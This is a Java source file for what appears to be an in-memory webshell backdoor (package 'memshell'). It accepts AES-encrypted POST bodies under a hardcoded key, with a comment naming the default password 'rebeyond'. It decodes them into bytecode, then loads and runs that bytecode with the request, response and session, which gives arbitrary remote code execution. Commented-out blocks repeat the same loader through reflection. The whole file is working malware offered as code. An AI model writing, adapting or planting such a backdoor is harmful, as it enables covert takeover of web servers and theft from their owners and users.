package net.rebeyond.memshell;

import net.rebeyond.memshell.redefine.MyRequest;
import net.rebeyond.memshell.redefine.MyResponse;
import net.rebeyond.memshell.redefine.MySession;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;


public class Evaluate {

    private static final long serialVersionUID = 1L;

    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }

        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        doPost(request, response);
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {

        try {
            if (MyRequest.getMethod(request).equals("POST")) {
                String k = "e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
                MySession.setAttribute(MyRequest.getSession(request),"u", k);
                Cipher c = Cipher.getInstance("AES");
                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                Object[] objects = new Object[]{request,response,MyRequest.getSession(request)};
                BufferedReader bf = MyRequest.getReader(request);

                byte[] evilClassBytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()));

                String sb = new String(evilClassBytes);
                //MyResponse.getWriter(response).print(sb);
                Class evilClass = new U(this.getClass().getClassLoader()).g(evilClassBytes);
                Object a = evilClass.newInstance();
                a.equals(objects);
                return;
//                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                method.setAccessible(true);
//                byte[] bytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
////                Object u = new U(this.getClass().getClassLoader());
////                u.g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(bf.readLine()))).newInstance().equals(objects);
//                ((Class) method.invoke(new URLClassLoader(new URL[]{}, this.getClass().getClassLoader()), bytes, 0, bytes.length)).newInstance().equals(objects);
//            if (MyRequest.getMethod(request).equals("POST")) {
//                Object session = MyRequest.getSession(request);
//                String k = "e45e329feb5d925b";
//                MySession.setAttribute(session, "u", k);
//                Cipher c = Cipher.getInstance("AES");
//                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
//
//                Object[] objects = new Object[]{request, response, session};
//                Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
//                method.setAccessible(true);
//                //BufferedReader bf = MyRequest.getReader(request);
//                byte[] bytes = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
//                ((Class) method.invoke(new URLClassLoader(new URL[]{}, this.getClass().getClassLoader()), bytes, 0, bytes.length)).newInstance().equals(objects);
//                return;
//                //new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(objects);
            }
            } catch (Exception e) {
            e.printStackTrace();
        }

    }

}
